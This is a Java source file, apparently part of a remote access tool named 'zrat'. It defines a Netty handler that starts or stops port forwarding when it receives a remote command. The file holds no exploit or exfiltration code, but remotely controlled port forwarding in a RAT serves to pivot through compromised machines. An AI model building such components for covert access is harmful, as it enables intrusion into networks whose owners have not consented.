package com.zrat.server.nio.handler;

import org.jboss.netty.bootstrap.ClientBootstrap;
import org.jboss.netty.channel.ChannelHandlerContext;
import org.jboss.netty.channel.MessageEvent;
import org.jboss.netty.channel.ChannelHandler.Sharable;
import org.jboss.netty.util.Timer;

import com.zrat.server.controller.PortForwardingService;
import com.zrat.server.controller.PortForwardingServiceImpl;
import com.zrat.transfer.model.TransferDataStruct;
@Sharable
public class PortForwardingHandler extends ServerNIOHandler {


    public PortForwardingHandler(ClientBootstrap bootstrap, Timer timer) {
		super(bootstrap, timer);
	}

	@Override
    public void messageReceived(ChannelHandlerContext ctx, MessageEvent e) throws Exception {
        if (e.getMessage() instanceof TransferDataStruct){
        	PortForwardingService service  = new PortForwardingServiceImpl();
        	TransferDataStruct data = (TransferDataStruct) e.getMessage();
        	if (PortForwardingService.COMMAND_PORTFORWARDING.equals(data.getAction())){
        		
        		service.startForward((String []) data.getObject());
        	}else if(PortForwardingService.COMMAND_STOPFORWARDING.equals(data.getAction())){
        		service.stopForward((String []) data.getObject());
        	}
        }
    }
}